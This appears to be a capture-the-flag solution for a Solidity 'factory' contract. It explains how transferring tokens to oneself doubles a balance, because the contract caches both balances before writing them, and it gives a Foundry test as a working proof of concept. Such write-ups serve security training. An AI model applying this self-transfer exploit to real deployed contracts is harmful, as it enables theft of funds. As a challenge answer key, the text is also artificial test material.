# Solution

## Description

The bug lies in the `transfer` function. The `transfer` function transfers the balance from one user to another user and does not check if the `_from` & `_to` are the same user or not. This leads to doubling the balance of a user.

## Attack Scenario

1. user1 `supply` 100 units.

2. user1 then `transfer` the 100 unit to himself i.e. to user1.

3. the `frombalance` stores the balance of `_from` (i.e. user1) and later updated the mapping of `_balances[from]`.

   > \_balances[_from] = frombalance - \_amount;

   > 100 - 100 = 0

4. the `tobalance` stored the balance of `_to` (i.e. again user1) which is 100 and `_balances[to]` mapping of user1 is incremented by 100.

   > \_balances[_to] = tobalance + \_amount;

   > 100 + 100 = 200

5. And now the balance of user1 is 200. Doubled the amout of supply

This way User1 is able to exploit a vulnerability in the contract to remove exactly double the amount you supply.

## PoC

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "src/factory.sol";


contract testfactory is Test, factory{

    factory _factory;
    address user1 = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;
    address user2 = 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2;
    function setUp() public {
        vm.prank(owner);
        _factory = new factory();


        vm.deal (user1 , 100);
        vm.deal (user2 , 100);


        vm.prank(user1);
        _factory.supply(user1, 100);
        vm.prank(user2);
        _factory.supply(user2, 100);
    }


    function testFactory() public {
        vm.prank(user1);

          //solution
        _factory.transfer(user1, user1, 100);



        uint256 newbalance = _factory.checkbalance(user1);
        assertEq(newbalance, 200);
    }
}
```
